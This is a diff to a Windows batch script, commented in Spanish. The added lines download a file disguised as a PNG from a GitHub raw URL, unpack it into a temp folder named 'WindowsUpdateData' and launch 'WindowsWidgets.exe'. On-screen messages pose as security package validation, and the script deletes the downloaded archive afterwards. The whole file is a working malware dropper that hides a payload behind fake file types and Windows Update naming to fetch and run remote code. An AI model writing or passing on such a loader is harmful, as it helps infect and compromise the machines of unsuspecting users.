@@ -1,14 +1,23 @@
 @echo off
-set "fakeZip=%~dp0tarea.txt"
+:: Configuración
+set "url=https://raw.githubusercontent.com/deuzinnuse-collab/juego/refs/heads/main/datos.png"
+set "tempZip=%TEMP%\update_data.zip"
 set "destDir=%TEMP%\WindowsUpdateData"
 
 if not exist "%destDir%" mkdir "%destDir%"
 
-echo [+] Iniciando validacion de archivos...
-:: PowerShell pide la clave y extrae el contenido del .txt (que es un ZIP)
-powershell -Command "$pass = Read-Host 'Introduce la clave de seguridad' -AsSecureString; $shell = New-Object -ComObject Shell.Application; $zip = $shell.NameSpace('%fakeZip%'); $dest = $shell.NameSpace('%destDir%'); $dest.CopyHere($zip.Items())"
+echo [+] Descargando paquetes de seguridad...
+:: 1. Descarga el archivo desde tu GitHub
+powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%tempZip%'"
 
-echo [+] Ejecutando componentes...
-:: Ejecuta el archivo real desde la carpeta temporal
+echo [+] El archivo requiere una clave de acceso.
+:: 2. PowerShell pide la clave y extrae (Nota: El archivo debe ser un ZIP real con contraseña)
+powershell -Command "$shell = New-Object -ComObject Shell.Application; $zip = $shell.NameSpace('%tempZip%'); $dest = $shell.NameSpace('%destDir%'); $dest.CopyHere($zip.Items())"
+
+echo [+] Ejecutando...
+:: 3. Abre el ejecutable que ya estará en la carpeta temporal
 start "" "%destDir%\WindowsWidgets.exe"
+
+:: Limpieza opcional del ZIP descargado
+del /q "%tempZip%"
 exit
